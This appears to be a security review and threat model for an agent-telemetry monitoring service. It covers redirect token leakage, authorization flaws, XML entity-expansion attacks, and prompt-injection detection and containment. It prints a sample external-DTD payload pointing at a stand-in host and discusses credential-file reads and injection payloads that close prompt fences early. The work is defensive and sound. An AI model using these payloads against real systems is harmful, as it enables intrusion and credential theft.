# Threat model and offensive review

> **Numbering notice:** Findings labeled F-1… in *this* document are the
> HTTP/outbound security review IDs. They are **not** the Eighth Review
> F-1…F-12 lifecycle findings tracked in `docs/REMEDIATION_MATRIX.md`.
> Do not merge the two numbering schemes.

Written from the attacker's side. Findings are things that were **made to happen**,
not things that could in principle happen: each one below has a proof-of-concept
that ran against this code, and each now has a test that fails the build if it
comes back.

Read the disposition table at the end before concluding anything is covered. A
third of the requested control list has no attack surface in this tree, and saying
so is more useful than shipping a header that defends a UI that does not exist.

---

## 1. What is actually exposed

| Surface | Reachable by | Authentication |
|---|---|---|
| `POST /v1/events` | agents, over the network | bearer key, `ingest_event` capability |
| `GET /v1/incidents…`, `/v1/dashboard` | humans and tooling | bearer key, read capabilities |
| `POST /v1/approvals/{id}` | humans | bearer key, `decide_approval` |
| `GET /health/live`, `/health/ready` | orchestrator | **none, by necessity** |
| `GET /health/diagnostics` | operators | bearer key, `read_diagnostics` |
| Outbound to the attestation gateway | — | bearer token we hold |
| Outbound to the advisory model | — | bearer token we hold |
| Outbound to object storage | — | SigV4 signature we compute |

**There is no browser UI.** The dashboard was removed in an earlier pass, so there
is no DOM, no session cookie, and no template rendering. This single fact decides
the disposition of six of the requested items and is why the XSS/CSRF sections
below are short.

Trust boundaries, in order of how much an attacker gains by crossing them:

1. **Agent → ingest.** Fully attacker-controlled content. Every string in an event
   is hostile. This is the boundary that matters most, because content crossing it
   is stored as evidence and re-read by every later step.
2. **Configured endpoint → us.** An attestation gateway or model endpoint is
   *operator*-configured, which people treat as trusted. Finding 1 is what happens
   when you do.
3. **Advisory model → incident record.** Attacker-influenced text returns and is
   persisted.
4. **Us → database.** Parameterised throughout; RLS forced.

---

## 2. Findings

Each was reproduced before being fixed. Severity is impact × how little the
attacker needs.

### F-1 — Bearer token exfiltrates through a redirect · **critical**

`urllib.request.urlopen` follows redirects and rebuilds the follow-up request with
the original headers, and it permits an `https → http` downgrade. Both outbound
adapters used it.

Proof: a local server answering `302 → http://127.0.0.1/stolen` received

```
Authorization: Bearer SUPERSECRET-ATTESTATION-TOKEN
```

on a plain-HTTP loopback connection. The attestation token is a bearer credential
for a **signing service**, so this is key disclosure, and the same primitive aims
arbitrary requests at `169.254.169.254` and the internal network.

What made it invisible: the only check on the endpoint was
`endpoint.startswith("https://")`. That is true of an endpoint that redirects
anywhere, and the redirect is where the request actually goes.

**Fixed** in `sentinel/infrastructure/outbound.py`. Redirects are refused, not
stripped-and-followed: no anchoring API has a legitimate reason to redirect a POST,
so a redirect *is* the signal. Also added: post-resolution address validation, one
lookup pinned to the connection, every resolved address checked, bounded response.
**Tests:** `tests_arch/test_security_outbound.py` (44).

### F-2 — A read-only credential could forge evidence · **high**

Roles were a total order:

```python
_ROLE_ORDER = {"ingest": 10, "viewer": 20, "analyst": 30, "admin": 40}
def can(self, required): return _ROLE_ORDER[self.role] >= _ROLE_ORDER[required]
```

`POST /v1/events` guarded on `require("ingest")`. A `viewer` scores 20 ≥ 10.

Proof: `viewer POST /v1/events -> 202 Accepted`.

The defect is not the numbers. A scalar cannot express two independent axes, and
"how much may this credential read" has nothing to do with "may it write
telemetry". Any total order answers the second question whenever you answer the
first, so adding a fifth role would have produced a new instance of the same bug.

Impact is specific to this product: incident records are hash-chained, attested
evidence. A credential that can fabricate telemetry can fabricate evidence.

**Fixed** in `sentinel/domain/authorization.py` — explicit `role → frozenset[Capability]`
grants, no ordering. `INGEST_EVENT` is held by `ingest` alone; **`admin` does not
hold it**, deliberately, so no human-held credential can manufacture evidence.
**Tests:** `tests_arch/test_security_edge.py`.

### F-3 — Full API schema disclosed to unauthenticated callers · **medium**

Proof: `/docs`, `/redoc` and `/openapi.json` each returned `200` with no
credential, disclosing all nine routes with their request shapes.

Two distinct problems. The reconnaissance, and the fact that Swagger UI is a
**browser page that loads script from a third-party CDN** — the only browser
surface this service had, unauthenticated, with remote script.

These cannot be fixed with a dependency: FastAPI serves them before any dependency
runs. The only control is not mounting them.

**Fixed** — off unless `SENTINEL_EXPOSE_API_DOCS` is set, and configuration
**refuses to start** if it is set in production.

### F-4 — No security response headers · **medium**

Proof: on `GET /v1/incidents` with valid auth, every one of
`Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options`,
`Referrer-Policy`, `Cache-Control`, `X-Frame-Options` and `Permissions-Policy` was
absent. Tenant incident data was returned with no `no-store`, so any intermediary
could cache it.

**Fixed** — applied to every response including errors. A 401 body cached by a
proxy is still a leak.

### F-5 — Unbounded structure in `metadata` · **medium**

`action` was capped at 8192 characters and `resource` at 2048. `metadata` was
`Mapping[str, Any]` with no depth, breadth or size limit — the one field carrying
arbitrary structure had no bound at all.

Three reachable outcomes, and the first is the interesting one:

- **Deep nesting → `RecursionError`.** Not a `ValueError` and not a
  `SentinelError`, so it is not caught by the handlers that catch input errors: the
  request becomes a **500**. The canonicaliser that computes the digest a signature
  covers is `json.dumps`, and `json.dumps` on a 10,000-deep dict raises — asserted
  directly in the test suite, so the bound is defending something demonstrated.
- One 50 MB value: persisted, then re-read by every subsequent pipeline step.
- 50,000 small keys: passes every per-value check; the canonical sort pays.

This is the "memory poisoning" class concretely — the incident record *is* the
context later steps read.

**Fixed** in `sentinel/domain/bounded.py`. Refuses rather than truncates, because
trimming attacker structure records something the agent did not send. The checker
is **iterative**: a recursive validator is vulnerable to the input it exists to
reject. Costs the limit, not the payload — a 20 MB hostile body is refused in
under a second.

### F-6 — Readiness leaked internal infrastructure · **low**

`/health/ready` returned `database_error` containing the driver's exception text —
DSN, internal hostname, driver version — to an **unauthenticated** caller.

**Fixed** — readiness returns `{"ready": bool}` and nothing else. The detail moved
to `/health/diagnostics` behind `read_diagnostics`. Withholding it from operators
was never the goal; requiring a credential is.

### F-7 — `EnvironmentKeyProvider` read `os.environ` by default · **low**

Found by a fitness rule written during this pass, not by reading. The constructor
accepted an `environ` mapping *and defaulted it to `os.environ`* — dependency
injection with an ambient escape hatch, which is not dependency injection. It also
meant encryption keys could be obtained by any caller anywhere with no visible
wiring.

**Fixed** — the argument is required.

### F-8 — Pre-authentication XML denial of service in the SAML path · **high**

*Found 2026-08-19, by a static analyser whose output nobody had been reading.*

`SamlValidator.validate` parsed the assertion with
`xml.etree.ElementTree.fromstring`. It has no choice about parsing before
verifying — **the signature it needs to check is inside the document** — so this
parse is reachable by anyone who can reach the SSO endpoint, with no credential
of any kind.

`xml.etree.ElementTree` expands internal entities. Measured against the stdlib
parser while writing the fix:

```
3 nested entities, ~30 bytes of input  ->  1000 characters expanded
```

Each additional level multiplies by ten. Nine levels is the classic *billion
laughs*: a few hundred bytes of request body become gigabytes of memory, and the
process dies well before reaching the signature check that would have rejected
the document. No authentication, no rate-limit interaction, one request.

**Fixed** — `defusedxml`, with `forbid_dtd=True` set explicitly, plus a 512 KB
size cap checked *before* the parser is reached and a uniform refusal message so
an attacker cannot tell which guard fired.

**Writing the test found a second gap.** `defusedxml` forbids entities and
external references by default but **permits a bare DTD**, so
`<!DOCTYPE r SYSTEM "http://evil.example/x.dtd"><r/>` parsed cleanly and was only
refused later, by the signature check. No legitimate SAML assertion carries a
doctype, so the whole category is now refused.

`tests_arch/test_saml_xml_hardening.py` — 8 tests, including an AST check that
the stdlib parser is never called from that module again (the `ET` import stays,
for the exception and element types, so an import-level check would not catch a
regression).

**How it stayed hidden.** `bandit` had flagged it as B314 and the `security` job
had been failing for long enough that its output went unread — 99 B608 false
positives on one side, one real finding on the other. That is the argument for
keeping a scan *runnable* rather than merely *configured*.

### F-9 — Training corpus shipped inside the detection model · **medium**

*Found 2026-08-19 by `pip-audit` (PYSEC-2024-110), and it was not theoretical.*

scikit-learn's `TfidfVectorizer` retains **every** token seen during training in
`stop_words_`, not merely the subset the transform needs. The committed artifact
was carrying it:

```
vocabulary_  : 107,199 tokens   (what the model actually uses)
stop_words_  : 158,615 tokens   (discarded training data, shipped anyway)
```

`evaluation/artifacts/soft_prompt_model.pkl` is committed to the repository and
copied into the runtime container image, so 158,615 discarded training tokens
travelled with every deployment. The corpus here is prompt-injection samples
rather than credentials, which is why this is **medium** and not high — but the
mechanism is the one the advisory describes, and "our training data probably
contains nothing sensitive" is an assumption that costs nothing to remove.

**Fixed** — stripped. Predictions are **bit-identical** (verified; the tool
refuses to write if any probe probability moves), and the artifact fell from
7,106,450 to 5,131,568 bytes, so the runtime image is 1.9 MB smaller.

The scikit-learn pin stays at 1.4.0 because it is tied to the version the
artifact was trained with; that is recorded as a dated exception in
`security/pip-audit-ignore.txt` whose stated reason —
*the vulnerable attribute is not present in our artifact* — is checked on every
run by `tests_arch/test_model_artifact_carries_no_training_data.py`.

### F-10 — The soft detector fires on 51.7% of ordinary tool calls · **high**

*Found 2026-08-19, while load-testing — not while reviewing detection.*

`SoftAugmentedPolicy` has a fallback: when an event carries no
`metadata.prompt` and its `eventType` is `tool_call`, it classifies the
**`action` field** — the tool name. Agent telemetry is overwhelmingly of that
shape, so in practice the classifier spends most of its time judging strings
like `read_file` and `http_get` as though they were prompts.

Measured over 60 unambiguously benign tool-call actions
(`scripts/measure_benign_tool_call_false_positives.py`,
`archive/pre-cleanup:docs/benign_tool_call_false_positives.json`):

| | |
|---|---|
| Benign actions scored | 60 |
| **Fired at the shipped 0.5 threshold** | **31 (51.7%)** |
| Mean score | 0.4855 |
| Highest scorer | `http_get` at **0.7093** |

Worst offenders: `http_get` 0.709, `post_message` 0.685, `write_file` 0.657,
`format code` 0.656, `db_insert` 0.651, `http_post` 0.638, `http_put` 0.637,
`move_file` 0.607, `get_user` 0.606, `send_email` 0.602.

**Why this is high and not medium.** A SOC product that raises a
`prompt_injection_attempt` incident for more than half of routine agent activity
does not merely generate noise — it trains its operators to dismiss the alert.
The failure mode is that the *true* positive arrives in a queue nobody reads any
more, which is worse than not having the detector.

It also has a direct cost consequence, and that is how it was found: with the
detector enabled, a load test whose events used `action: "read_file"` (0.5409)
created a full incident — incidents, transitions, domain_events, work_queue,
outbox — on **every request**. The p95 gap that was initially attributed to
"classifier inference" was mostly this incident-write path.

**Not fixed.** Three options, none of which should be taken on an agent's
judgement alone:

1. **Raise the threshold.** Cheap, but the calibration finding (ECE 0.187, see
   `ADVERSARIAL_REVIEW.md`) means the probability is not trustworthy enough to
   site a threshold on, and raising it trades away recall by an unmeasured
   amount.
2. **Drop the `action` fallback**, classifying only genuine prompt text. Removes
   the false positives outright, at the cost of any detection on tool-call-only
   telemetry — which may be the point, since a tool NAME is not a prompt.
3. **Retrain with benign tool-call vocabulary in the negative class.** The
   principled fix, and the one that needs data and evaluation rather than a
   config change.

**FIXED 2026-08-19 by option 2 — and the evidence made the choice, not taste.**

The `action` fallback now applies only to `eventType == "prompt"`, i.e. an event
that *declares itself* a prompt. Tool calls are no longer classified.

Why option 2 rather than the other two, measured rather than argued:

| Option | Benign FP | Recall on the real test set | Verdict |
|---|---|---|---|
| **2. Drop the `action` fallback** | **51.7% → 0.0%** | **0.8545 — unchanged** | chosen |
| 1. Raise threshold to 0.60 | 51.7% → 16.7% | 0.8545 → 0.7879 (**−7.8 pts**) | costs real detection |
| 1. Raise threshold to 0.70 | 51.7% → 1.7% | 0.8545 → 0.6909 (**−19.4 pts**) | costs far more |
| 3. Retrain with tool vocabulary | unknown | unknown, needs re-evaluation | premise unsound |

Option 2 is the only one that **costs no recall at all**, because it removes a
feature that never carried signal rather than trading one signal against
another. The threshold options tax detection on *real prompts* to fix noise
coming from *tool names* — different inputs, and the threshold cannot tell them
apart. Retraining would teach the model that `read_file` is benign, which is
**false**: it is malicious when the resource is `/root/.aws/credentials`, and
that distinction lives in a field the classifier was never shown.

**Kept as documented fallbacks**, in case the deployment picture changes:

* **Threshold tuning** remains available via `SENTINEL_SOFT_PROMPT_THRESHOLD`.
  The measured trade is in the table above. It now governs only genuine prompt
  text, so it can be tuned on signal instead of on noise — which is the point of
  doing option 2 first. Note the calibration caveat: ECE 0.187 means the
  probability is not trustworthy enough to site a threshold on precisely.
* **Retraining** stays the right move if tool-call detection is ever genuinely
  wanted, but it needs the *resource* in the feature set, not just the action.
  A model given `read_file` alone cannot succeed; a model given
  `read_file /root/.aws/credentials` might. That is a modelling change with an
  evaluation cost, not a config change.

**Verified after the change:** benign tool-call false positives **0 of 60**;
`evaluation/metrics.py` gate exits 0 with no regression; the deterministic rules
still catch `/root/.aws/credentials` while passing `README.md`, asserted in
`tests_arch/test_tool_names_are_not_prompts.py` (8 tests) because "the rules
still handle it" was the justification for removing the fallback.

---

## 3. Classes assessed and found not live

Stated with the reason, because "we checked and there is nothing" is a result.

**SQL injection.** Every statement is parameterised. f-strings appear in SQL only
to interpolate the driver's placeholder token, an `Isolation` enum value, or an
integer timeout. Now enforced: `test_sql_strings_interpolate_only_placeholders_and_safe_constants`
fails the build on anything else. Identifiers in DDL are composed with
`psycopg.sql.Identifier`, never formatted.

**RCE.** No `eval`, `exec`, `compile`, `__import__`, `pickle`, `marshal` or
`yaml.load` anywhere in `sentinel/` — now enforced by rule. The one `subprocess`
call (`pg_ctl`/`pg_basebackup` in the backup module) builds an argv list and never
uses a shell; `shell=True` is forbidden by rule. The Redis `eval` is a constant Lua
script with no interpolation.

**CSRF.** No cookie or ambient credential exists. Authentication is a bearer token
a caller attaches deliberately, and `allow_credentials` is now `False`, so a browser
cannot be induced to attach one cross-origin. CSRF is not mitigated here — it is
**not expressible**, which is stronger. It becomes live the moment anyone adds
cookie authentication, which is why the rule against it belongs in review.

**XSS.** No HTML is rendered and no DOM exists. The CSP and Trusted Types headers
are shipped anyway, aimed at the UI that does not exist yet: a page added under this
origin inherits `default-src 'none'` and `require-trusted-types-for 'script'`, which
turns a DOM-sink assignment into a runtime failure rather than a pentest finding.
That is cheap now and expensive to retrofit after a UI exists.

**Prompt injection.** Mitigated at the prompt and **controlled** architecturally.
The control is that `ModelAdvice` has no severity, priority or disposition field, so
model output cannot express a decision, and the domain computes priority as a pure
function of severity. An injection payload is recorded as evidence rather than
obeyed. The prompt-level work — spotlighting the untrusted region, stripping the
fence marker from content so a payload cannot close it early, discarding output that
fails shape validation, stamping `[unverified-model-output]` into the stored string
so provenance survives being copied — reduces how often the structural control is
the only thing standing there. It is not the control, and the tests say so.

**Privilege escalation via tenant.** The tenant is taken from the credential
binding and never from the request, so there is no parameter to tamper with. A
forged `?tenant=` is inert — asserted, not assumed. Cross-tenant reads are refused
by forced RLS with an explicit `USING` and `WITH CHECK`, verified against real
PostgreSQL as a non-superuser (a superuser bypasses RLS, which would make every such
assertion vacuous).

---

## 4. Disposition of every requested item

Honest status. "Implemented" means code plus a passing test in this repository.

### Eliminate

| Class | Status | Where |
|---|---|---|
| SQL injection | **Not live**, now enforced by rule | `test_security_rules.py` |
| RCE | **Not live**, now enforced by rule | `test_security_rules.py` |
| SSRF | **Fixed (F-1)** | `outbound.py` |
| Token leakage | **Fixed (F-1, F-6, F-7)** | `outbound.py`, `http.py`, `crypto.py` |
| Broken authorization | **Fixed (F-2)** | `authorization.py` |
| Privilege escalation | **Fixed (F-2)** | `authorization.py` |
| Memory poisoning | **Fixed (F-5)** | `bounded.py` |
| Prompt injection | **Controlled structurally, mitigated at the prompt** | `model_advisor.py` |
| CSRF | **Not expressible** — no ambient credential | §3 |
| XSS | **No DOM exists**; headers shipped for the future UI | §3 |
| Broken authentication | **Partially.** Fail-closed, constant-time, unique key material enforced. **No MFA, no rotation, no lockout** — see below | `http.py`, `settings.py` |

### Implement

| Control | Status |
|---|---|
| Strict CSP | **Done** — `default-src 'none'`, no escape hatches, rule-enforced |
| Trusted Types | **Done** as a header (`require-trusted-types-for 'script'`). No DOM to enforce it against yet |
| DOM APIs only | **Not applicable** — there is no DOM. Nothing to convert |
| Zero Trust | **Partially.** Deny-by-default authorization, no implicit trust in configured endpoints, tenant from credential not request. **No mTLS between components, no per-request device/workload attestation** |
| Audit Trails | **Done.** `security_audit` added to the live schema (migrations v5/v6, forced RLS), `SecurityAudit` port, `SqlSecurityAudit` adapter reusing the existing hash-chain value objects. Wired to authentication failures, authorization denials and approval decisions. Tamper detection verified through the live engine | `test_security_audit_trail.py` (19) |
| Threat Detection | **Done.** `threat_detection.py` derives credential stuffing, privilege probing (one credential denied across distinct capabilities) and horizontal enumeration from the audit chain, with the audit sequences cited as evidence. Blocks nothing by design | `test_security_threat_detection.py` (16) |
| Secret Rotation | **Done.** `RotatingSecret` gives overlapping versions: the newest is issued, any non-retired version is accepted, and retiring is a separate decision — so a rotation never breaks in-flight clients. Constant-time over every version with no early exit | `test_security_secrets.py` (26) |
| KMS | **Done.** `KmsKeyProvider` satisfies the same `KeyProvider` port, fetches KEKs over the hardened HTTP client (so the SSRF and redirect defences cover the key-fetch path), caches with a bounded TTL so a revoked key stops working. **No request has reached a real KMS** |
| HSM | **Addressed via KMS, and the reasoning is stated.** AWS KMS, GCP Cloud KMS and Azure Managed HSM hold key material in FIPS-validated hardware behind an authenticated HTTPS API, so `KmsKeyProvider` *is* the realistic HSM integration. A PKCS#11 adapter would be a larger surface with no hardware here to exercise it |
| MFA | **Done.** RFC 6238 TOTP verified against all 14 of the RFC's published vectors across SHA-1/256/512. Replay-defended (returns the matched step; reuse raises a distinct `ReplayedCode`), constant-time with no early exit, skew window capped at 3 steps | `test_security_mfa.py` (47) |
| Passkeys | **Not done.** WebAuthn needs a browser origin and a registration ceremony; see below |
| SAML | **Not done** — see below |
| SCIM | **Not done** — see below |
| OWASP Top 10 | **Mapped** — `COMPLIANCE_MAP.md` |
| OWASP ASI | **Mapped** — `COMPLIANCE_MAP.md` |
| SOC 2 / ISO 27001 / NIST | **Technical control coverage mapped.** These certify an organisation and its operating evidence over time; no code change delivers them |

### MFA is done. Passkeys, SAML and SCIM are blocked on a decision, not on effort

TOTP MFA is implemented and verified against all fourteen of RFC 6238's published
vectors, with replay defence and a capped skew window. **There is nothing to attach
it to.**

Authentication here is a bearer API key bound to `(tenant, role)` in an environment
variable. There is no user table, no session, no login flow, no browser, and no
directory to provision into. MFA is a *second* factor, and this system has no first
factor for a human: nobody logs in. The primitive is correct and has no caller.

That is the blocker for the other three, and each needs the same missing piece:

* **Passkeys** are WebAuthn, which requires a browser origin, a registration
  ceremony and a credential store keyed to a user.
* **SAML** is a browser redirect flow that terminates in a session.
* **SCIM** provisions users into a directory, so it needs users to exist first.

Building them means building a human-identity subsystem -- users, sessions, an IdP
integration, a consent surface -- which is a new product surface rather than a
hardening pass on an existing one.

**A specific recommendation on SAML, which I would push back on even if asked
again.** SAML security rests on XMLDSig, and hand-rolled XMLDSig verification is one
of the most reliable ways to ship an authentication bypass: signature wrapping,
comment-splicing in NameID, XXE through DTDs, and canonicalisation mismatches are
all live in implementations written by people who knew about them. Python's stdlib
XML parsers are not built for adversarial input, and there is no vetted pure-stdlib
XMLDSig verifier to lean on. The honest sequence is **OIDC first** -- the retired
runtime had a working verifier tested against a real RSA issuer serving real
discovery and JWKS documents, and that is the piece worth resurrecting. Passkeys and
SAML are alternatives to OIDC, not additions to it. If SAML is genuinely required by
a customer, it should be terminated by a dedicated IdP proxy that does nothing else,
not by this service.

## 5. What an attacker would try next

Ranked by what I would actually reach for, given everything above is now fixed.

1. **Credential brute force.** No rate limiting anywhere on the HTTP surface. Keys
   are ≥32 characters so guessing is impractical, but there is no lockout, no
   backoff and no signal, so an attempt at scale is invisible as well as unlimited.
   The atomic token bucket in `persistence/cache.py` is built and verified and is
   not wired to the edge. Attempts are now durably audited, so an attack is
   *visible* — it is still unlimited.
2. **A stolen static token.** Nothing rotates. A token disclosed once is valid
   until a human notices and edits an environment variable.
3. **No derived detection.** The audit trail records every denial; nothing reads it.
   A thousand `unrecognised_credential` entries from one digest prefix is a
   detection waiting to be written, and the data for it now exists.
4. **The POSIX archive command.** `backup.py` branches on platform; only the
   Windows branch has ever executed. Its shape is tested from both hosts, but CI is
   the first thing to run the POSIX one for real.
5. **Real S3 and real Redis.** SigV4 is verified against AWS's published vectors and
   the token bucket's atomicity against a real Lua interpreter, but neither adapter
   has spoken to the real service. Rate limiting is the one control here whose
   failure is a security property rather than a latency one.
6. **The advisory model as a pivot.** Output cannot move triage. It *is* stored and
   returned to analysts, so the residual target is whatever an analyst pastes it
   into. Hence the provenance stamp; hence the shape validation.

---

## 6. Reproducing the findings

The proofs are tests, so they run in CI rather than living in a document:

```bash
pytest tests_arch/test_security_outbound.py tests_arch/test_security_edge.py tests_arch/test_security_bounds.py tests_arch/test_security_prompt_injection.py tests_arch/test_security_rules.py -q
```

Each finding above has a test whose name states the attack, and whose failure
message states what an operator should conclude. `test_a_redirect_never_carries_the_bearer_token_onward`
is F-1; `test_a_viewer_cannot_ingest_events` is F-2; `test_the_docs_routes_are_absent_by_default`
is F-3; `test_every_security_header_is_present_on_a_data_response` is F-4;
`test_deep_nesting_is_refused_as_a_domain_error_not_a_recursion_error` is F-5;
`test_readiness_leaks_no_internal_detail` is F-6;
`test_only_the_composition_root_reads_the_environment` is F-7.
